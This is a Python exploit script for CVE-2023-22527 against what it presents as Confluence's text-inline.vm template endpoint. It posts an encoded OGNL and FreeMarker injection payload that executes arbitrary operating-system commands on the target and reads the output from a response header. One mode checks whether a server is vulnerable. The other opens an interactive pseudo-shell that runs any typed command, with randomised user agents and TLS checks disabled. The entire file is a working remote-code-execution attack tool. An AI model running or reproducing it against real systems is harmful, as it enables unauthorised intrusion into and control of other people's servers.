import sys
import requests
import urllib3
import argparse
from fake_useragent import UserAgent
from colorama import Fore, init
from urllib import parse

urllib3.disable_warnings()
init()


arg_parse = argparse.ArgumentParser()
arg_parse.add_argument("-u", type=str, help="Target url.", default="")
arg_parse.add_argument("-a", type=bool, help="Attack choice.", default=False)
arg_parse.add_argument("-tt", type=int, help="Timeout.", default=10)
args = arg_parse.parse_args()

ua = UserAgent()


def send_cmd(url, command):
    label_1 = b"aaa%5Cu0027%2B%23request.get%28%5Cu0027.KEY_velocity.struts2.context%5Cu0027%29."
    label_2 = b"internalGet%28%5Cu0027ognl%5Cu0027%29.findValue%28%23parameters.poc%5B0%5D%2C%7B%7D%29%2B%5Cu0027"
    poc_1 = b"%40org.apache.struts2.ServletActionContext%40getResponse%28%29.setHeader%28%5Cu0027Cmd-Ret%5Cu0027%2C%28"
    poc_2 = b"new+freemarker.template.utility.Execute%28%29%29.exec%28%7B%22" + parse.quote(command).encode() + b"%22%7D%29%29"
    data = b"label=" + label_1 + label_2 + b"&poc=" + poc_1 + poc_2
    header = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'JSESSIONID=DB3D0FC5F2A1DD509624FEE5F4EB8BEB',
        'User-Agent': ua.random,
        'Origin': url,
        'Referer': url
    }
    payload_url = "{}/template/aui/text-inline.vm".format(url)
    try:
        res = requests.post(url=payload_url, headers=header, data=data, verify=False, timeout=args.tt)
    except Exception as e:
        print(Fore.RED + "[-] There were some errors when the target executed the command!")
    else:
        if res.status_code == 200:
            try:
                result = res.headers['Cmd-Ret']
            except Exception as e:
                return ""
            else:
                return result


def check_res(url):
    result = send_cmd(url=url, command="echo 'Thisisatest'")
    if "Thisisatest" in result:
        print(Fore.GREEN + "[*] Target {} has ".format(args.u), end="")
        print(Fore.RED + "vulnerabilities!")
    else:
        print(Fore.WHITE + "[-] Target {} may not have vulnerabilities!".format(args.u))


def url_value(url):
    while url[-1] == "/":
        url = url[:-1]
    return url


def run():
    if args.a:
        try:
            while True:
                cmd = input(Fore.WHITE + "confluence@CVE-2023-22527:-# ")
                if "exit" in cmd:
                    sys.exit()
                result = send_cmd(url=url_value(url=args.u), command=cmd)
                print(result)
        except KeyboardInterrupt:
            sys.exit()
    else:
        check_res(url=url_value(url=args.u))


if __name__ == '__main__':
    banner = """
................................................................................
..####....####...##..##..######..##......##..##..######..##..##...####...######.
.##..##..##..##..###.##..##......##......##..##..##......###.##..##..##..##.....
.##......##..##..##.###..####....##......##..##..####....##.###..##......####...
.##..##..##..##..##..##..##......##......##..##..##......##..##..##..##..##.....
..####....####...##..##..##......######...####...######..##..##...####...######.
................................................................................
-------------------------------> CVE-2023-22527 <-------------------------------
................................................................................
    """
    print(Fore.CYAN + banner)
    if args.u != "":
        run()
    else:
        print(Fore.RED + "[-] Parameter '-u' can not be empty!")
        sys.exit()
